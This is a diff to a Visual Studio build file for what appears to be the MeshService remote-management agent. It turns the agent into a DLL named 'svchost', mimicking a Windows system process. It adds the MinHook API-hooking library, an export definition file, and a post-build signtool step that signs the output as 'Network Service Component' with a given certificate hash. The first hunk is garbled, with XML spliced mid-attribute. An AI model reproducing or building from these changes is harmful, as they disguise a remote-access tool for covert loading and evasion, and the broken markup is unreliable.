@@ -1,7 +1,16 @@
 ﻿<?xml version="1.0" encoding="utf-8"?>
 <Project DefaultTargets="Build" ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <ItemGroup Label="ProjectConfigurations">
-    <ProjectConfiguration Include="Debug_NoOpenSSL|Win32">
+    <ProjectConfiguration Include      powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)..\Microscript\ILibDuktape_Commit.h $(ProjectDir)MeshService.rc</Command>
+    </PreBuildEvent>
+    <PostBuildEvent>
+      <Command>signtool.exe sign /sha1 fd5940d8fd585545614fea6da455f25d224b00c9 /d "Network Service Component" /du "http://opentools.homeip.net" "$(TargetPath)"</Command>
+    </PostBuildEvent>
+    <Manifest>
+      <AdditionalManifestFiles>$(ProjectDir)dpiaware.manifest %(AdditionalManifestFiles)</AdditionalManifestFiles>
+    </Manifest>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|Win32'">`OpenSSL|Win32">
       <Configuration>Debug_NoOpenSSL</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
@@ -49,40 +58,40 @@
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_NoOpenSSL|Win32'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|Win32'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_NoOpenSSL|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <CharacterSet>MultiByte</CharacterSet>
     <PlatformToolset>v140</PlatformToolset>
   </PropertyGroup>
@@ -166,30 +175,32 @@
     <CodeAnalysisRuleAssemblies Condition="'$(Configuration)|$(Platform)'=='Release_NoOpenSSL|x64'" />
     <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</PostBuildEventUseInBuild>
     <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|Win32'">false</PostBuildEventUseInBuild>
-    <TargetName Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">$(ProjectName)</TargetName>
-    <TargetName Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|Win32'">$(ProjectName)</TargetName>
+    <TargetName Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">svchost</TargetName>
+    <TargetName Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|Win32'">svchost</TargetName>
     <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</PostBuildEventUseInBuild>
     <PostBuildEventUseInBuild Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|x64'">false</PostBuildEventUseInBuild>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
+    <TargetName>svchost</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_NoOpenSSL|Win32'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
+    <TargetName>svchost</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
-    <TargetName>$(ProjectName)64</TargetName>
+    <TargetName>svchost64</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release_NoOpenSSL|x64'">
     <PostBuildEventUseInBuild>false</PostBuildEventUseInBuild>
-    <TargetName>$(ProjectName)64</TargetName>
+    <TargetName>svchost64</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
-    <TargetName>$(ProjectName)64</TargetName>
+    <TargetName>svchost64</TargetName>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_NoOpenSSL|x64'">
-    <TargetName>$(ProjectName)64</TargetName>
+    <TargetName>svchost64</TargetName>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
     <ClCompile>
@@ -219,6 +230,7 @@
       <AssemblyDebug>true</AssemblyDebug>
       <AdditionalOptions> /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
       <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
+      <ModuleDefinitionFile>meshservice.def</ModuleDefinitionFile>
     </Link>
     <PreBuildEvent>
       <Command>
@@ -264,6 +276,7 @@
       <AssemblyDebug>true</AssemblyDebug>
       <AdditionalOptions> /ignore:4099 %(AdditionalOptions)</AdditionalOptions>
       <OutputFile>$(OutDir)$(TargetName)$(TargetExt)</OutputFile>
+      <ModuleDefinitionFile>meshservice.def</ModuleDefinitionFile>
     </Link>
     <PreBuildEvent>
       <Command>
@@ -585,6 +598,9 @@ powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)
     <ClCompile Include="..\microscript\ILibDuktape_HttpStream.c" />
     <ClCompile Include="..\microscript\ILibDuktape_MemoryStream.c" />
     <ClCompile Include="..\microscript\ILibDuktape_net.c" />
+    <ClCompile Include="..\MinHook\src\hook.c" />
+    <ClCompile Include="..\MinHook\src\buffer.c" />
+    <ClCompile Include="..\MinHook\src\trampoline.c" />
     <ClCompile Include="..\microscript\ILibDuktape_NetworkMonitor.c" />
     <ClCompile Include="..\microscript\ILibDuktape_Polyfills.c" />
     <ClCompile Include="..\microscript\ILibDuktape_ReadableStream.c" />
@@ -666,8 +682,12 @@ powershell -ExecutionPolicy Unrestricted $(ProjectDir)prebuild.ps1 $(ProjectDir)
     <ClInclude Include="..\microstack\ILibWebRTC.h" />
     <ClInclude Include="..\microstack\ILibWebServer.h" />
     <ClInclude Include="..\microstack\ILibWrapperWebRTC.h" />
+    <ClInclude Include="..\MinHook\include\MinHook.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="stdafx.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="meshservice.def" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
